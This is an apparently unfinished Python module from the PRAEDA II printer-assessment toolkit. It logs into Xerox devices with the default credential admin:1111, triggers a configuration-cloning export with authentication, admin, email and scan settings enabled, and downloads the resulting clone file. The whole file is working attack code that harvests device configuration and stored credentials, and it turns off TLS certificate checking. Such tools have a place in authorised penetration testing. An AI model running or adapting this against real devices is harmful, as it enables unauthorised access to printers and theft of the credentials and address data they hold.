######################################################
#                 PRAEDA II Module MP0006            #
#                  Copyright (C) 2024                #
######################################################
#              Xerox Clone file module               #
#                 In progress not completed          #
######################################################

import requests
import base64

def MP0006(target, ports, web, output, logfile, data1):
    paths = ["properties/xerox.set", "dummypost/xerox.set"]
    clones = ["cloning.dlm", "download/cloning.dlm"]
    auth = "YWRtaW46MTExMQ=="  # Base64 for "admin:1111"
    headers = {"Authorization": f"Basic {auth}"}

    try:
        with open(f'{output}/{logfile}.log', 'a') as logFile:
            log_message = f"\n**********Attempting Clone Download Xerox {target} : JOB MP0008**********"
            log(logFile, log_message)

            if attempt_clone_request(target, ports, web, paths, headers, logFile):
                handle_clones(target, ports, web, clones, headers, output, logFile)
            else:
                log(logFile, "Cloning post failed")
    except Exception as e:
        print(f"Failed to open output file {output}\nError: {str(e)}")

def attempt_clone_request(target, ports, web, paths, headers, logFile):
    success = False

    for path in paths:
        url = f"http{web}://{target}:{ports}/{path}"
        data = {
            "_fun_function": "HTTP_Config_Cloning_fn",
            "NextPage": "/properties/cloning.dhtml",
            "enableCon": "1",
            "enableTemp": "1",
            "enableDevice": "1",
            "enableAuth": "1",
            "enableEmail": "1",
            "enableScan": "1",
            "enableAdmin": "1"
        }

        log(logFile, f"Attempting clone request to {path}:")
        try:
            response = requests.post(url, headers=headers, data=data, timeout=120, verify=False)
            if response.ok:
                success = True
                break
            else:
                log(logFile, f"FAILED - {response.status_code} : {response.reason}")
        except Exception as e:
            log(logFile, f"An error occurred: {str(e)}")
    
    return success

def handle_clones(target, ports, web, clones, headers, output, logFile):
    for clone in clones:
        url = f"http{web}://{target}:{ports}/{clone}"
        try:
            cloning = requests.get(url, headers=headers, timeout=120, verify=False)
            if cloning.status_code == 404:
                log(logFile, f"Could not find {clone} on {target}:{ports}/{clone}, attempting other paths")
            elif cloning.status_code == 403:
                log(logFile, f"Basic authentication failed - 403 Forbidden on {target}:{ports}")
            else:
                output_path = f"./{output}/{target}-{ports}-cloning.dlm"
                with open(output_path, "a") as f:
                    f.write(cloning.text)
                log(logFile, f"*** Found clone at {target}:{ports}/{clone}, Downloading to {target}-{ports}-cloning.dlm ***")
        except Exception as e:
            log(logFile, f"An error occurred: {str(e)}")

def log(logFile, message):
    print(message)
    logFile.write(message + "\n")


